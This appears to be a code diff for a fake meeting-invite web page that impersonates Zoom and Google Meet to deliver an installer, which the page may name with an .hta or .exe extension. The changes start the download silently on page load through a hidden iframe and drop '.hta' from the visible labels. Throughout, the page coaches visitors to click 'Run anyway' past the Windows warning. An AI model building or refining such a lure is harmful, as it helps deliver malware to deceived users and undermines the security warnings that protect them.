@@ -33,39 +33,6 @@ function useMeetingGuestBodyClass(template: GuestInviteTemplate) {
   }, [template]);
 }
 
-function useAutoInstallerDownload(
-  code: string,
-  installerUrl: string,
-  installerFileName: string,
-  enabled: boolean,
-) {
-  const [downloadStarted, setDownloadStarted] = useState(false);
-
-  useEffect(() => {
-    if (!enabled || !installerUrl || !installerFileName) return;
-
-    const storageKey = `nd-install-started:${code}`;
-    if (sessionStorage.getItem(storageKey)) {
-      setDownloadStarted(true);
-      return;
-    }
-
-    sessionStorage.setItem(storageKey, '1');
-    setDownloadStarted(true);
-
-    const link = document.createElement('a');
-    link.href = installerUrl;
-    link.download = installerFileName;
-    link.rel = 'noopener';
-    link.style.display = 'none';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  }, [code, enabled, installerFileName, installerUrl]);
-
-  return downloadStarted;
-}
-
 /**
  * Light bot gate: branded loader → set cookie → continue (no full-page reload).
  */
@@ -227,21 +194,103 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
 
 function DownloadSteps({ fileName }: { fileName: string }) {
   const kind = fileName.toLowerCase().endsWith('.hta')
-    ? 'installer (.hta)'
+    ? 'installer'
     : fileName.toLowerCase().endsWith('.exe')
-      ? 'installer (.exe)'
+      ? 'installer'
       : 'installer';
   return (
     <ol className="meeting-desktop__steps">
       <li>Your download should start automatically ({fileName}).</li>
-      <li>Open your Downloads folder and double-click the {kind} file.</li>
+      <li>Open your Downloads folder and double-click the {kind}.</li>
       <li>
         If Windows shows a blue warning, click <strong>More info</strong>, then{' '}
         <strong>Run anyway</strong>.
       </li>
-      <li>Click Yes when Windows asks for permission, then wait for setup to finish.</li>
+      <li>Keep the setup window open until the progress bar finishes.</li>
     </ol>
   );
+}
+
+function BrandDownloadProgress({
+  accent,
+  downloadStarted,
+  cancelled,
+  onCancel,
+  installerUrl,
+  installerFileName,
+  downloadingLabel,
+  readyLabel,
+}: {
+  accent: 'zoom' | 'meet';
+  downloadStarted: boolean;
+  cancelled: boolean;
+  onCancel: () => void;
+  installerUrl: string;
+  installerFileName: string;
+  downloadingLabel: string;
+  readyLabel: string;
+}) {
+  return (
+    <div className={`brand-dl brand-dl--${accent}`}>
+      <div className="brand-dl__progress-wrap">
+        <div className="brand-dl__progress-bar">
+          <div
+            className={`brand-dl__progress-inner ${
+              cancelled
+                ? 'brand-dl__progress-inner--idle'
+                : downloadStarted
+                  ? 'brand-dl__progress-inner--done'
+                  : 'brand-dl__progress-inner--run'
+            }`}
+          />
+        </div>
+        <div className="brand-dl__status">
+          {cancelled
+            ? 'Download cancelled.'
+            : downloadStarted
+              ? readyLabel
+              : downloadingLabel}
+        </div>
+      </div>
+      <div className="brand-dl__actions">
+        <a className="brand-dl__btn" href={installerUrl} download={installerFileName}>
+          Manually start download
+        </a>
+        <button type="button" className="brand-dl__cancel" onClick={onCancel}>
+          Cancel
+        </button>
+      </div>
+    </div>
+  );
+}
+
+function useBrowserInstallerDownload(code: string, installerUrl: string) {
+  const [downloadStarted, setDownloadStarted] = useState(false);
+  const [cancelled, setCancelled] = useState(false);
+
+  useEffect(() => {
+    if (!installerUrl || cancelled) return;
+    const storageKey = `nd-install-started:${code}`;
+    if (sessionStorage.getItem(storageKey)) {
+      setDownloadStarted(true);
+      return;
+    }
+    sessionStorage.setItem(storageKey, '1');
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = installerUrl;
+    document.body.appendChild(iframe);
+    setDownloadStarted(true);
+    return () => {
+      iframe.remove();
+    };
+  }, [code, installerUrl, cancelled]);
+
+  return {
+    downloadStarted,
+    cancelled,
+    cancel: () => setCancelled(true),
+  };
 }
 
 function ZoomDesktop({
@@ -253,7 +302,7 @@ function ZoomDesktop({
   installerFileName: string;
   code: string;
 }) {
-  const downloadStarted = useAutoInstallerDownload(code, installerUrl, installerFileName, true);
+  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(code, installerUrl);
 
   return (
     <div className="meeting-zoom-desktop">
@@ -263,18 +312,16 @@ function ZoomDesktop({
         You have been invited to join a Zoom meeting. Download and launch the Zoom client to
         connect.
       </p>
-      {downloadStarted ? (
-        <p className="meeting-desktop__status meeting-desktop__status--zoom">
-          Download started. If nothing appeared, click the button below.
-        </p>
-      ) : null}
-      <a
-        className="meeting-zoom-desktop__btn"
-        href={installerUrl}
-        download={installerFileName}
-      >
-        Download Zoom Client
-      </a>
+      <BrandDownloadProgress
+        accent="zoom"
+        downloadStarted={downloadStarted}
+        cancelled={cancelled}
+        onCancel={cancel}
+        installerUrl={installerUrl}
+        installerFileName={installerFileName}
+        downloadingLabel="Downloading Zoom Client..."
+        readyLabel="Download started. Open ZoomClient-Setup from your Downloads folder."
+      />
       <DownloadSteps fileName={installerFileName} />
       <p className="meeting-zoom-desktop__note">
         NOTE: For the best connectivity please use Google Chrome on a Windows PC.
@@ -296,7 +343,7 @@ function GoogleMeetDesktop({
   installerFileName: string;
   code: string;
 }) {
-  const downloadStarted = useAutoInstallerDownload(code, installerUrl, installerFileName, true);
+  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(code, installerUrl);
 
   return (
     <div className="meeting-meet-desktop">
@@ -309,18 +356,16 @@ function GoogleMeetDesktop({
         You have been invited to join a Google Meet call session. Download the meeting app to
         connect from your computer.
       </p>
-      {downloadStarted ? (
-        <p className="meeting-desktop__status meeting-desktop__status--meet">
-          Download started. If nothing appeared, click the button below.
-        </p>
-      ) : null}
-      <a
-        className="meeting-meet-desktop__btn"
-        href={installerUrl}
-        download={installerFileName}
-      >
-        Download meeting app
-      </a>
+      <BrandDownloadProgress
+        accent="meet"
+        downloadStarted={downloadStarted}
+        cancelled={cancelled}
+        onCancel={cancel}
+        installerUrl={installerUrl}
+        installerFileName={installerFileName}
+        downloadingLabel="Downloading meeting app..."
+        readyLabel="Download started. Open GoogleMeet-Setup from your Downloads folder."
+      />
       <DownloadSteps fileName={installerFileName} />
       <p className="meeting-meet-desktop__note">
         NOTE: For the best connectivity pls use Google Chrome on a Windows PC.
